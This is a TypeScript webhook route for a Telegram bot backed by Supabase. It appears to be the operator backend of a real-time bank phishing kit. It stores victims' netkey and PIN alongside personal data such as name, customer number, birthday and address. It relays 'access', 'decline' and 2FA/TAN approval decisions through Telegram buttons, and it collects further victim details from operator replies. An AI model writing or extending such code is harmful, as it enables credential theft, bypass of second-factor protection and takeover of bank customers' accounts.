import { createFileRoute } from "@tanstack/react-router";
import { createClient } from "@supabase/supabase-js";
import { renderSessionSummary, parseOperatorReply, parseDevicesReply, type QrSessionRow } from "@/lib/qrSessionSummary";

function admin() {
  return createClient(process.env["SUPABASE_URL"]!, process.env["SUPABASE_SERVICE_ROLE_KEY"]!, {
    auth: { persistSession: false },
  });
}

const SESSION_COLS =
  "id, telegram_chat_id, telegram_message_id, prompt_message_id, branch_name, netkey, pin, " +
  "customer_anrede, customer_name, customer_number, customer_birthday, " +
  "customer_address_street, customer_address_city, customer_email, customer_mobile";

async function tg(method: string, body: Record<string, unknown>) {
  const token = process.env["TELEGRAM_BOT_TOKEN"];
  if (!token) return null;
  const res = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  }).catch(() => null);
  if (!res) return null;
  return res.json().catch(() => null);
}

async function editMessage(chatId: string | number, messageId: number, text: string) {
  await tg("editMessageText", { chat_id: chatId, message_id: messageId, text, parse_mode: "HTML" });
}

async function answerCallback(callbackId: string, text?: string) {
  await tg("answerCallbackQuery", { callback_query_id: callbackId, text: text ?? "" });
}

async function sendTfaButtons(chatId: string | number, sessionId: string) {
  const body = await tg("sendMessage", {
    chat_id: chatId,
    text: "🔐 <b>2FA-Freigabe abwarten</b>\nBitte Ergebnis der TAN-Freigabe wählen:",
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "✅ 2FA Access", callback_data: `2fa_access:${sessionId}` },
        { text: "❌ 2FA Decline", callback_data: `2fa_decline:${sessionId}` },
      ]],
    },
  });
  return body?.ok ? (body.result.message_id as number) : null;
}

async function sendCollectPrompt(chatId: string | number, replyTo: number | null) {
  const body = await tg("sendMessage", {
    chat_id: chatId,
    ...(replyTo ? { reply_to_message_id: replyTo, allow_sending_without_reply: true } : {}),
    text:
      "👤 <b>Bitte Kundendaten als <u>Antwort auf DIESE Nachricht</u> senden</b>\n" +
      "Format: je Zeile <code>Key: Wert</code>\n\n" +
      "Anrede: Herr\nName: Max Mustermann\nKundenNr: 1234567\nGeburtstag: 01.01.1980\n" +
      "Adresse: Musterstraße 12\nPLZOrt: 12345 Musterstadt\nEmail: (optional)\nMobil: (optional)",
    parse_mode: "HTML",
  });
  return body?.ok ? (body.result.message_id as number) : null;
}

async function refreshOriginal(sb: ReturnType<typeof admin>, sessionId: string) {
  const { data } = await sb.from("telegram_sessions").select(SESSION_COLS).eq("id", sessionId).maybeSingle();
  const row = data as any as (QrSessionRow & { telegram_chat_id: string | null; telegram_message_id: number | null }) | null;
  if (!row?.telegram_chat_id || !row.telegram_message_id) return;
  await editMessage(row.telegram_chat_id, row.telegram_message_id, renderSessionSummary(row));
}

export const Route = createFileRoute("/api/public/telegram/webhook")({
  server: {
    handlers: {
      GET: async ({ request }) => {
        const token = process.env["TELEGRAM_BOT_TOKEN"];
        if (!token) return new Response("no_token", { status: 500 });
        const url = new URL(request.url);
        const webhookUrl = `${url.origin}/api/public/telegram/webhook`;
        const res = await fetch(`https://api.telegram.org/bot${token}/setWebhook`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ url: webhookUrl, allowed_updates: ["callback_query", "message"] }),
        });
        return Response.json({ registered: webhookUrl, telegram: await res.json().catch(() => null) });
      },
      POST: async ({ request }) => {
        const token = process.env["TELEGRAM_BOT_TOKEN"];
        if (!token) return new Response("no_token", { status: 500 });

        const update = await request.json().catch(() => null);
        const sb = admin();

        // --- Text messages: operator replies with customer data ---
        const msg = update?.message;
        if (msg?.text && msg.reply_to_message?.message_id) {
          const replyTo = msg.reply_to_message.message_id as number;
          // Devices prompt reply?
          const { data: devSess } = await sb
            .from("telegram_sessions")
            .select("id")
            .eq("devices_prompt_message_id", replyTo)
            .maybeSingle();
          if (devSess) {
            const devices = parseDevicesReply(String(msg.text));
            if (devices.length) {
              await sb
                .from("telegram_sessions")
                .update({ customer_devices: devices })
                .eq("id", (devSess as any).id);
            }
            return Response.json({ ok: true });
          }
          // Otherwise: customer data prompt reply.
          const { data: session } = await sb
            .from("telegram_sessions")
            .select(SESSION_COLS)
            .eq("prompt_message_id", replyTo)
            .maybeSingle();
          if (session) {
            const patch = parseOperatorReply(String(msg.text));
            if (Object.keys(patch).length) {
              await sb.from("telegram_sessions").update(patch).eq("id", (session as any).id);
              await refreshOriginal(sb, (session as any).id);
            }
          }
          return Response.json({ ok: true });
        }

        // --- Callback queries: inline buttons ---
        const cb = update?.callback_query;
        if (!cb?.data || !cb?.id) return Response.json({ ok: true });

        const [action, sessionId] = String(cb.data).split(":");
        if (!action || !sessionId) {
          await answerCallback(cb.id);
          return Response.json({ ok: true });
        }

        const username = cb.from?.username || cb.from?.first_name || String(cb.from?.id ?? "");
        const patch: Record<string, unknown> = { decided_by_username: username, decided_at: new Date().toISOString() };
        let toast = "";
        if (action === "access") { patch["decision"] = "access"; toast = "Access erteilt"; }
        else if (action === "decline") { patch["decision"] = "decline"; toast = "Abgelehnt"; }
        else if (action === "2fa") { patch["decision"] = "2fa_pending"; toast = "2FA angefordert"; }
        else if (action === "2fa_access") { patch["decision"] = "2fa_access"; toast = "2FA freigegeben"; }
        else if (action === "2fa_decline") { patch["decision"] = "2fa_decline"; toast = "2FA abgelehnt"; }
        else if (action === "device_accept") { patch["decision"] = "device_accept"; toast = "Geräte freigegeben"; }
        else if (action === "device_decline") { patch["decision"] = "device_decline"; toast = "Geräte abgelehnt"; }
        else { await answerCallback(cb.id); return Response.json({ ok: true }); }

        await sb.from("telegram_sessions").update(patch).eq("id", sessionId);
        await answerCallback(cb.id, toast);

        const chatId = cb.message?.chat?.id;
        const messageId = cb.message?.message_id;

        if (action === "access" && chatId) {
          const promptId = await sendCollectPrompt(chatId, messageId ?? null);
          if (promptId) await sb.from("telegram_sessions").update({ prompt_message_id: promptId }).eq("id", sessionId);
          await refreshOriginal(sb, sessionId);
        } else if (chatId && messageId) {
          const orig = typeof cb.message?.text === "string" ? cb.message.text : "";
          await editMessage(chatId, messageId, `${orig}\n\n<b>➡ ${toast}</b> (by @${username})`);
        }

        if (action === "2fa" && chatId) {
          await sendTfaButtons(chatId, sessionId);
        }

        if (action === "2fa_access" && chatId) {
          // after 2fa_access also collect customer data
          const promptId = await sendCollectPrompt(chatId, null);
          if (promptId) await sb.from("telegram_sessions").update({ prompt_message_id: promptId }).eq("id", sessionId);
          await refreshOriginal(sb, sessionId);
        }

        return Response.json({ ok: true });
      },
    },
  },
});
